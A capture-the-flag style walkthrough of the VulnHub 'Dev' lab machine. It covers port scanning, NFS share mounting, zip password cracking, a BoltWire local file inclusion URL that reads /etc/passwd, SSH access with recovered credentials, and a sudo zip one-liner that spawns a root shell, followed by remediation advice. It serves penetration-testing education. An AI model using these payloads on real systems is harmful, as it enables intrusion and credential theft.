# Dev - VulnHub Walkthrough
> A complete penetration testing walkthrough of the **Dev** machine from TCM/VulnHub, documenting the attack path from reconnaissance to root compromise.

---

# Table of Contents

- Executive Summary
- Machine Information
- Attack Path Overview
- Reconnaissance
- Enumeration
- Exploitation
- Privilege Escalation
- Flag Capture
- Vulnerability Assessment
- Remediation & Fixes
- Key Takeaways
- Final Pentester's Observation

---

# Executive Summary

The **Dev** machine demonstrates how multiple low and medium severity vulnerabilities can be chained together to achieve complete system compromise.

The attack chain involved:

1. Information Disclosure
2. Directory Enumeration
3. NFS Misconfiguration
4. Local File Inclusion (LFI)
5. Credential Disclosure
6. SSH Access
7. Sudo Misconfiguration
8. Root Compromise

---

# Machine Information

| Attribute | Value |
|-----------|--------|
| Machine | Dev |
| Platform | VulnHub |
| Difficulty | Easy-Medium |
| Operating System | Linux |
| Author | TCM Security |
| Objective | Gain Root Access |

---

# Attack Path Overview

```text
Recon
 └── Port Discovery
      └── Web Enumeration
           └── Directory Enumeration
                └── NFS Enumeration
                     └── LFI
                          └── Credential Discovery
                               └── SSH Access
                                    └── Privilege Escalation
                                         └── Root
```

---

# Reconnaissance

## Host Discovery

```bash
netdiscover
```

or

```bash
nmap -sn 192.168.126.0/24
```

Target:

```text
192.168.126.133
```

---

## Port Scan

```bash
nmap -sC -sV -A -Pn 192.168.126.133
```

### Open Ports

| Port | Service |
|------|----------|
| 22 | SSH |
| 80 | HTTP |
| 2049 | NFS |
| 8080 | HTTP |

---

## Pentester's Observation

The machine exposes multiple services, immediately increasing the attack surface. The presence of both NFS and two web services suggests multiple potential entry points.

---

# Enumeration

## Web Enumeration

```bash
nikto -h http://192.168.126.133
```

The application disclosed:

- Development information
- Technology stack information
- Potential debug artifacts

---

## Directory Enumeration

### Feroxbuster

```bash
feroxbuster -u http://192.168.126.133 -x php
```

### FFUF

```bash
ffuf -u http://192.168.126.133/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

### Interesting Directories

```text
/app
/src
/dev
```

---

## Pentester's Observation

Directories such as `/app` and `/src` frequently contain source code, credentials, or configuration files and should always be prioritized.

---

# Application Enumeration

The application at:

```text
http://192.168.126.133:8080/dev
```

allowed user registration.

Credentials:

```text
Username: test
Password: test
```

A search functionality was identified.

---

## Pentester's Observation

Search functionality often leads to vulnerabilities such as:

- SQL Injection
- Command Injection
- Local File Inclusion

---

# NFS Enumeration

## Enumerate Shares

```bash
showmount -e 192.168.126.133
```

Share discovered:

```text
/srv/nfs
```

Mount the share:

```bash
mkdir /mnt/dev
mount -t nfs 192.168.126.133:/srv/nfs /mnt/dev
```

Discovered:

```text
save.zip
```

---

## Crack the ZIP

```bash
fcrackzip -D -p rockyou.txt save.zip
```

Information discovered:

- SSH private key
- User reference: `jp`
- Password candidate: `I_love_java`

---

## Pentester's Observation

NFS shares commonly expose backup files and sensitive information that significantly aid post-exploitation activities.

---

# Exploitation

## Boltwire CMS Research

Exploit reference:

https://www.exploit-db.com/exploits/48411

---

## Local File Inclusion

```text
http://192.168.126.133:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

Result:

```text
jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash
```

---

## Credential Discovery

Configuration file:

```text
/app/config/config.yml
```

Credentials for:

```text
jeanpaul
```

were recovered.

---

## Initial Access

```bash
ssh jeanpaul@192.168.126.133
```

Successful login.

---

## Pentester's Observation

Configuration files are one of the most valuable targets during enumeration as they frequently contain hardcoded credentials and application secrets.

---

# Privilege Escalation

## Enumerate Sudo Permissions

```bash
sudo -l
```

Output:

```text
(ALL) NOPASSWD: /usr/bin/zip
```

---

## Abuse Zip via GTFOBins

```bash
touch data.txt
zip data.zip data.txt
sudo zip data.zip data.txt -T --unzip-command='sh -c /bin/sh'
```

Verify:

```bash
whoami
```

Output:

```text
root
```

---

## Pentester's Observation

Misconfigured sudo permissions continue to be one of the most common and impactful privilege escalation vectors on Linux systems.

---

# Flag Capture

```bash
cd /root
ls
cat flag.txt
```

Root flag successfully captured.

---

# Vulnerability Assessment

| Vulnerability | Severity |
|--------------|-----------|
| Information Disclosure | Medium |
| Exposed Directories | Medium |
| NFS Misconfiguration | High |
| Local File Inclusion | High |
| Hardcoded Credentials | High |
| Sudo Misconfiguration | Critical |

---

# Remediation & Fixes

## Priority 1 – Remove Dangerous Sudo Permissions

```bash
visudo
```

Remove:

```text
(ALL) NOPASSWD: /usr/bin/zip
```

---

## Priority 2 – Patch Boltwire CMS

- Upgrade application
- Validate user input
- Restrict file access

---

## Priority 3 – Remove Hardcoded Credentials

- Use environment variables
- Rotate credentials
- Implement secret management

---

## Priority 4 – Secure NFS

```text
/srv/nfs 192.168.126.0/24(ro,sync,no_subtree_check)
```

---

## Priority 5 – Reduce Information Disclosure

- Disable debug information
- Remove development files
- Hide stack traces

---

# Key Takeaways

- Enumeration wins boxes.
- Low severity findings matter.
- Never ignore NFS.
- Configuration files are gold mines.
- Search functionality often hides critical vulnerabilities.
- Knowledge of GTFOBins is invaluable.

---

# Final Pentester's Observation

The **Dev** machine perfectly demonstrates how attackers chain together seemingly harmless findings into complete system compromise.

No single vulnerability directly led to root access. Instead, success depended on:

1. Thorough enumeration.
2. Information gathering.
3. Exploiting application weaknesses.
4. Credential harvesting.
5. Abusing privilege misconfigurations.

> Attackers rarely need one critical vulnerability. Multiple small weaknesses, when chained together, are often enough to completely compromise an environment.
